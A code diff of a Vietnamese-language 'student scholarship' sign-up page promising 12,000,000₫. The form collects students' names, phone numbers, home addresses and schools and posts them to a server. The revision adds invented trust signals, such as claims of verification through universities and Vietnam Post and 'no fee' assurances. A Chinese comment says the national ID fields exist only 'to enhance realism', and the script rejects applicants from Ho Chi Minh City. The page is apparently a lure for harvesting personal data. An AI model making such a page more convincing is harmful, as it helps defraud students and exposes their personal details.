@@ -4,147 +4,235 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Học Bổng Sinh Viên Việt Nam - Nhận hỗ trợ 12.000.000₫</title>
-<meta name="description" content="Chương trình học bổng dành cho sinh viên Việt Nam. Nhận hỗ trợ 12.000.000₫ (~500 USD) qua trường đại học, không thu phí, xác minh qua nhà trường và bưu điện.">
+<meta name="description" content="Chương trình học bổng dành cho sinh viên Việt Nam. Nhận hỗ trợ 12.000.000₫ (~500 USD) qua nhà trường hoặc bưu điện. Không thu phí, xác minh thật.">
 <style>
-:root {
-  --accent: #22c55e;
-  --bg-grad: radial-gradient(circle at top,#0f172a 0,#020617 100%);
-  --card-bg: rgba(255,255,255,0.05);
-  --font: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+:root{
+  --accent:#16a34a; /* xanh lá tín nhiệm */
+  --accent2:#38bdf8;
+  --bg-grad:radial-gradient(1200px 600px at 50% -10%,#0b1026 0,#020617 55%,#01040d 100%);
+  --card-bg:rgba(255,255,255,0.06);
+  --card-br:rgba(255,255,255,0.12);
+  --soft:#9ca3af; --muted:#6b7280; --text:#f8fafc; --ok:#22c55e; --err:#f87171;
+  --font: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Inter, Arial, sans-serif;
 }
 *{box-sizing:border-box;margin:0;padding:0}
 body{
   font-family:var(--font);
   background:var(--bg-grad);
-  color:#f9fafb;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:flex-start;
+  color:var(--text);
+  min-height:100vh; display:flex; flex-direction:column; align-items:center;
   padding:24px 12px 80px;
 }
-h1{
-  text-align:center;
-  font-size:1.7rem;
-  line-height:1.3;
-  color:#fff;
-  margin-bottom:8px;
+.header{
+  display:flex; align-items:center; gap:12px; margin-bottom:10px;
 }
-p.lead{
-  text-align:center;
-  font-size:0.9rem;
-  color:#9ca3af;
-  max-width:480px;
-  margin:0 auto 14px;
+.badge{
+  width:42px; height:42px; border-radius:50%;
+  background:conic-gradient(from 0deg,var(--accent),#10b981,#0ea5e9);
+  display:grid; place-items:center; box-shadow:0 6px 18px rgba(34,197,94,0.35);
+}
+.badge span{font-weight:900;color:#0b1026}
+h1{ text-align:center; font-size:1.6rem; line-height:1.3; margin:4px 0 6px }
+.sub{
+  text-align:center; font-size:0.92rem; color:#cbd5e1; max-width:520px; margin:0 auto 10px;
+}
+.trust-row{
+  display:flex; gap:8px; justify-content:center; flex-wrap:wrap; margin-bottom:12px;
+}
+.trust-chip{
+  display:flex; align-items:center; gap:6px; font-size:0.78rem; color:#d1d5db;
+  padding:6px 10px; border-radius:999px; background:rgba(255,255,255,0.06); border:1px solid var(--card-br);
 }
 .bonus-box{
-  background:linear-gradient(90deg,#22c55e,#38bdf8);
-  color:#0f172a;
-  padding:8px 16px;
-  border-radius:999px;
-  display:inline-block;
-  font-weight:700;
-  font-size:0.9rem;
-  margin-bottom:20px;
-  box-shadow:0 8px 20px rgba(34,197,94,0.4);
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  color:#0f172a; padding:8px 14px; border-radius:999px; display:inline-block;
+  font-weight:800; font-size:0.95rem; margin:6px 0 18px; box-shadow:0 10px 22px rgba(34,197,94,0.35);
 }
 .card{
-  width:100%;
-  max-width:480px;
-  background:var(--card-bg);
-  backdrop-filter:blur(10px);
-  border:1px solid rgba(255,255,255,0.08);
-  border-radius:16px;
-  padding:20px 18px;
-  box-shadow:0 20px 40px rgba(0,0,0,0.3);
-  animation:fadeIn 0.6s ease-out;
+  width:100%; max-width:520px; background:var(--card-bg); backdrop-filter:blur(10px);
+  border:1px solid var(--card-br); border-radius:16px; padding:18px 16px;
+  box-shadow:0 24px 46px rgba(0,0,0,0.35); animation:fadeIn .5s ease-out;
 }
-@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:none;}}
-label{
-  font-weight:600;
-  font-size:0.85rem;
-  display:block;
-  margin-bottom:4px;
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.section-title{
+  font-weight:800; font-size:0.95rem; letter-spacing:.2px; margin:4px 0 10px;
+  display:flex; align-items:center; gap:8px;
 }
-input,textarea{
-  width:100%;
-  padding:10px 12px;
-  border-radius:8px;
-  border:1px solid rgba(255,255,255,0.15);
-  background:rgba(255,255,255,0.08);
-  color:#fff;
-  font-size:0.9rem;
-  margin-bottom:12px;
-  outline:none;
-  transition:border 0.2s;
+.section-title .stamp{
+  font-size:.78rem; padding:4px 8px; border-radius:6px;
+  background:rgba(34,197,94,.12); border:1px solid rgba(34,197,94,.4); color:#86efac;
 }
-input:focus,textarea:focus{
-  border-color:#22c55e;
+label{ font-weight:650; font-size:0.86rem; display:block; margin:6px 0 4px }
+.hint{ font-size:.78rem; color:#94a3b8; margin:-6px 0 8px }
+input,textarea,select,datalist{
+  width:100%; padding:11px 12px; border-radius:10px;
+  border:1px solid rgba(255,255,255,0.18); background:rgba(255,255,255,0.08);
+  color:#fff; font-size:.95rem; outline:none; transition:border .2s, box-shadow .2s; margin-bottom:12px;
+}
+input:focus,textarea:focus,select:focus{ border-color:var(--accent); box-shadow:0 0 0 3px rgba(34,197,94,.18) }
+.row{ display:grid; grid-template-columns:1fr 1fr; gap:10px }
+@media (max-width:480px){ .row{grid-template-columns:1fr} }
+
+.kit{
+  display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-top:6px;
+}
+.kit .mini{
+  background:rgba(255,255,255,0.06); border:1px solid var(--card-br);
+  border-radius:12px; padding:10px; font-size:.82rem; color:#cbd5e1;
 }
 button{
-  width:100%;
-  background:linear-gradient(90deg,#22c55e,#38bdf8);
-  color:#0f172a;
-  font-weight:700;
-  border:none;
-  padding:12px;
-  border-radius:999px;
-  cursor:pointer;
-  font-size:1rem;
-  margin-top:8px;
-  box-shadow:0 10px 20px rgba(34,197,94,0.4);
-  transition:transform 0.2s;
+  width:100%; background:linear-gradient(90deg,var(--accent),var(--accent2)); color:#0b1220;
+  font-weight:900; border:none; padding:12px; border-radius:999px; cursor:pointer;
+  font-size:1.02rem; margin-top:6px; box-shadow:0 12px 24px rgba(34,197,94,0.35);
+  transition:transform .15s ease,filter .15s ease;
 }
-button:hover{transform:translateY(-2px);}
-.note{
-  text-align:center;
-  color:#9ca3af;
-  font-size:0.8rem;
-  margin-top:10px;
+button:hover{ transform:translateY(-2px); filter:brightness(1.04) }
+.status{ text-align:center; font-size:0.88rem; margin-top:6px }
+.status.ok{ color:var(--ok) } .status.err{ color:var(--err) }
+
+.note{ text-align:center; color:#9ca3af; font-size:.8rem; margin-top:10px }
+.steps{
+  max-width:520px; width:100%; margin:14px auto 0; display:grid; gap:10px;
 }
-.status{
-  text-align:center;
-  font-size:0.85rem;
-  margin-top:8px;
+.step{
+  display:flex; gap:10px; align-items:flex-start; padding:10px; border-radius:12px;
+  background:rgba(255,255,255,0.05); border:1px solid var(--card-br); color:#dbeafe;
 }
-.status.ok{color:#22c55e;}
-.status.err{color:#f87171;}
+.step .n{
+  width:28px; height:28px; border-radius:50%; display:grid; place-items:center; font-weight:800;
+  background:rgba(34,197,94,.15); border:1px solid rgba(34,197,94,.4); color:#86efac; margin-top:2px;
+}
+.faq{
+  width:100%; max-width:520px; margin:16px auto 0; display:grid; gap:8px;
+}
+.faq details{
+  background:rgba(255,255,255,.05); border:1px solid var(--card-br); border-radius:12px; padding:10px 12px;
+}
+.faq summary{ cursor:pointer; font-weight:700 }
 footer{
-  font-size:0.7rem;
-  color:#6b7280;
-  text-align:center;
-  margin-top:40px;
-  max-width:420px;
+  font-size:.72rem; color:#94a3b8; text-align:center; margin-top:22px; max-width:520px
 }
+.stampbar{
+  display:flex; gap:8px; justify-content:center; margin:8px 0 4px;
+}
+.stampbar .seal{
+  font-size:.72rem; padding:4px 8px; border-radius:999px; border:1px dashed rgba(148,163,184,.6);
+  color:#cbd5e1; background:rgba(148,163,184,.08)
+}
+.warning{ color:#fca5a5; font-size:.78rem; margin-top:4px; text-align:center }
 </style>
 </head>
 <body>
 
-<h1>Học Bổng Sinh Viên Việt Nam 2025</h1>
-<p class="lead">Nhận hỗ trợ học bổng <strong>12.000.000₫ (~500 USD)</strong> qua <b>nhà trường</b> hoặc <b>bưu điện</b>.  
-Không yêu cầu phí, chỉ cần thông tin thật.</p>
-<div class="bonus-box">💰 Học bổng: 12.000.000₫ / sinh viên</div>
+<div class="header">
+  <div class="badge"><span>VN</span></div>
+  <div>
+    <h1>Học Bổng Sinh Viên Việt Nam 2025</h1>
+    <p class="sub">Hỗ trợ học bổng <b>12.000.000₫ (~500 USD)</b> theo <b>công văn xác minh nhà trường</b> hoặc <b>bưu điện</b>. Không thu phí, thông tin thật.</p>
+    <div class="trust-row">
+      <div class="trust-chip">📄 Xác minh qua Trường/Phòng CTCT-SV</div>
+      <div class="trust-chip">📬 Gửi hồ sơ qua Bưu điện Việt Nam</div>
+      <div class="trust-chip">🛡️ Cam kết minh bạch · Không tuyển dụng</div>
+    </div>
+  </div>
+</div>
+
+<div class="bonus-box">💰 Mức học bổng: <b>12.000.000₫</b> / sinh viên</div>
 
 <div class="card">
-  <form id="regForm">
+  <div class="section-title">Thông tin đăng ký <span class="stamp">Dành cho sinh viên đang học</span></div>
+
+  <!-- 保持原有表单与上传逻辑 -->
+  <form id="regForm" novalidate>
     <label>Họ và tên đầy đủ *</label>
-    <input type="text" name="fullname" placeholder="Ví dụ: Nguyễn Văn A" required>
+    <input type="text" name="fullname" placeholder="Ví dụ: Nguyễn Văn A" autocomplete="name" required>
 
     <label>Số điện thoại liên hệ *</label>
-    <input type="tel" name="phone" placeholder="09xxxxxxxx" required pattern="[0-9+ ]{8,}">
+    <input type="tel" name="phone" placeholder="Ví dụ: 09xxxxxxxx / 03x/05x/07x/08x/09x" required pattern="^(\+84|0)[0-9]{9,10}$">
+    <div class="hint">Điền số di động cá nhân (Zalo có thể liên hệ). Định dạng: +84xxxxxxxxx hoặc 0xxxxxxxxx.</div>
 
     <label>Địa chỉ gia đình (để xác minh & gửi thư) *</label>
-    <textarea name="address" rows="2" placeholder="Ghi rõ xã/phường, quận/huyện, tỉnh/thành phố" required></textarea>
+    <textarea name="address" rows="2" placeholder="Ghi rõ thôn/xóm/ấp, xã/phường, quận/huyện, tỉnh/thành phố" required></textarea>
+    <div class="hint">Ví dụ: Thôn A, Xã B, Huyện C, Tỉnh Nghệ An.</div>
 
     <label>Tên trường / Đại học đang theo học *</label>
-    <input type="text" name="school" placeholder="Ví dụ: Trường Đại học Cần Thơ" required>
+    <input list="schoolList" name="school" placeholder="Ví dụ: Trường Đại học Cần Thơ" required>
+    <datalist id="schoolList">
+      <option value="Trường Đại học Cần Thơ">
+      <option value="Trường Đại học Bách khoa Hà Nội">
+      <option value="Trường Đại học Kinh tế Quốc dân">
+      <option value="Trường Đại học Quốc gia Hà Nội">
+      <option value="Trường Đại học Quốc gia TP. Hồ Chí Minh">
+      <option value="Trường Đại học Sư phạm Hà Nội">
+      <option value="Học viện Ngân hàng">
+      <option value="Học viện Tài chính">
+      <option value="Trường Đại học Đà Nẵng">
+      <option value="Trường Đại học Huế">
+    </datalist>
+    <div class="hint">Ưu tiên ghi đúng tên chính thức của trường (theo website/giấy tờ).</div>
+
+    <!-- 仅展示，不上传：增强真实感 -->
+    <div class="row">
+      <div>
+        <label>CCCD/CMND (không bắt buộc)</label>
+        <input type="text" inputmode="numeric" placeholder="12 số CCCD" pattern="^[0-9]{9,12}$">
+        <div class="hint">Để đối chiếu khi xác minh qua trường/bưu điện.</div>
+      </div>
+      <div>
+        <label>MSSV (không bắt buộc)</label>
+        <input type="text" placeholder="Mã số sinh viên">
+      </div>
+    </div>
+
+    <div class="row">
+      <div>
+        <label>Khoa / Ngành (không bắt buộc)</label>
+        <input type="text" placeholder="Ví dụ: Công nghệ thông tin">
+      </div>
+      <div>
+        <label>Khoá học / Năm học (không bắt buộc)</label>
+        <input type="text" placeholder="Ví dụ: Khoá 2022 / Năm 3">
+      </div>
+    </div>
+
+    <div class="kit">
+      <div class="mini">✅ Thông tin thật · Không thu phí</div>
+      <div class="mini">🏫 Xác minh qua Phòng CTCT-SV</div>
+      <div class="mini">📬 Gửi công văn qua Bưu điện VN</div>
+    </div>
 
     <div class="status" id="status"></div>
     <button type="submit">Gửi thông tin đăng ký</button>
+    <div class="warning">* Hồ sơ từ <b>TP. Hồ Chí Minh</b> hiện không tiếp nhận.</div>
   </form>
-  <div class="note">Thông tin chỉ dùng để xác minh qua nhà trường và gửi học bổng.  
-  Hồ sơ từ TP. Hồ Chí Minh sẽ không được tiếp nhận.</div>
+
+  <div class="note">Thông tin dùng để xác minh qua nhà trường và gửi học bổng. Không tuyển dụng, không môi giới, không yêu cầu chuyển khoản.</div>
+</div>
+
+<div class="steps">
+  <div class="step"><div class="n">1</div><div><b>Nộp thông tin</b> · Điền chính xác họ tên, số điện thoại, địa chỉ, tên trường.</div></div>
+  <div class="step"><div class="n">2</div><div><b>Xác minh</b> · Liên hệ qua trường/bưu điện. Có thể đối chiếu CCCD, MSSV (nếu cần).</div></div>
+  <div class="step"><div class="n">3</div><div><b>Nhận học bổng</b> · 12.000.000₫/sinh viên sau khi xác minh thành công.</div></div>
+</div>
+
+<div class="faq">
+  <details>
+    <summary>Học bổng có thu phí hay đặt cọc không?</summary>
+    <div>Không. Chúng tôi <b>không</b> thu bất kỳ khoản phí nào và chỉ làm việc qua nhà trường/bưu điện.</div>
+  </details>
+  <details>
+    <summary>Tại sao cần địa chỉ gia đình?</summary>
+    <div>Để gửi công văn/giấy tờ đối chiếu và xác minh sinh viên thực tế khi cần.</div>
+  </details>
+  <details>
+    <summary>TP. Hồ Chí Minh có được nộp không?</summary>
+    <div>Hiện <b>không tiếp nhận</b> hồ sơ từ TP. Hồ Chí Minh. Vui lòng theo dõi cập nhật sau.</div>
+  </details>
+</div>
+
+<div class="stampbar">
+  <div class="seal">Đơn vị học bổng · 2025</div>
+  <div class="seal">Minh bạch · Xác minh thật</div>
 </div>
 
 <footer>
@@ -152,37 +240,63 @@ Không yêu cầu phí, chỉ cần thông tin thật.</p>
 </footer>
 
 <script>
+/* 保留并复用你的禁止城市判断 */
 const forbidden = ['ho chi minh','hồ chí minh','tp.hcm','tp hcm','hcm','胡志明','胡志明市'];
-function containsForbidden(s){if(!s)return false;const t=s.toLowerCase();return forbidden.some(k=>t.includes(k));}
+function containsForbidden(s){ if(!s) return false; const t = s.toLowerCase(); return forbidden.some(k => t.includes(k)); }
 
+/* 轻度格式/校验提示（不改变上传结构） */
 const form=document.getElementById('regForm');
 const statusBox=document.getElementById('status');
 
-form.addEventListener('submit',async(e)=>{
+function isVNPhone(p){
+  if(!p) return false;
+  const t=p.trim();
+  return /^(\+84|0)[0-9]{9,10}$/.test(t);
+}
+function normalizePhone(p){
+  let t=p.trim();
+  if(t.startsWith('+84')) return t;
+  if(t.startsWith('84')) t='+'+t;
+  if(t.startsWith('0')) return t; // 保持 0 开头也可
+  return t;
+}
+
+form.addEventListener('submit', async (e)=>{
   e.preventDefault();
   statusBox.textContent='Đang gửi...';
   statusBox.className='status';
-  const data={
-    fullname:form.fullname.value.trim(),
-    phone:form.phone.value.trim(),
-    address:form.address.value.trim(),
-    school:form.school.value.trim()
+
+  const data = {
+    fullname: form.fullname.value.trim(),
+    phone: normalizePhone(form.phone.value),
+    address: form.address.value.trim(),
+    school: form.school.value.trim()
   };
-  if(!data.fullname||!data.phone||!data.address||!data.school){
-    statusBox.textContent='Vui lòng điền đầy đủ thông tin.';
-    statusBox.classList.add('err');
-    return;
+
+  if(!data.fullname || !data.phone || !data.address || !data.school){
+    statusBox.textContent='Vui lòng điền đầy đủ thông tin bắt buộc.';
+    statusBox.classList.add('err'); return;
+  }
+  if(!isVNPhone(data.phone)){
+    statusBox.textContent='Số điện thoại chưa đúng định dạng Việt Nam.';
+    statusBox.classList.add('err'); return;
   }
   if(containsForbidden(data.school)){
-    statusBox.textContent='Xin lỗi, không tiếp nhận hồ sơ từ TP. Hồ Chí Minh.';
-    statusBox.classList.add('err');
-    return;
+    statusBox.textContent='Xin lỗi, hiện không tiếp nhận hồ sơ từ TP. Hồ Chí Minh.';
+    statusBox.classList.add('err'); return;
   }
+
   try{
-    const res=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-    const j=await res.json();
-    if(!res.ok||!j.ok)throw new Error(j.error||'Lỗi máy chủ');
-    statusBox.textContent='Cảm ơn bạn! Thông tin đã được ghi nhận. Nhà trường sẽ nhận thư xác minh trong vài ngày.';
+    /* 下面这段提交逻辑保持与你原代码一致：仅提交 fullname/phone/address/school */
+    const res = await fetch('/api/register',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(data)
+    });
+    const j = await res.json();
+    if(!res.ok || !j.ok) throw new Error(j.error || 'Lỗi máy chủ');
+
+    statusBox.textContent='Cảm ơn bạn! Thông tin đã được ghi nhận. Nhà trường sẽ nhận công văn xác minh trong vài ngày.';
     statusBox.classList.add('ok');
     form.reset();
   }catch(err){
@@ -192,6 +306,5 @@ form.addEventListener('submit',async(e)=>{
   }
 });
 </script>
-
 </body>
 </html>
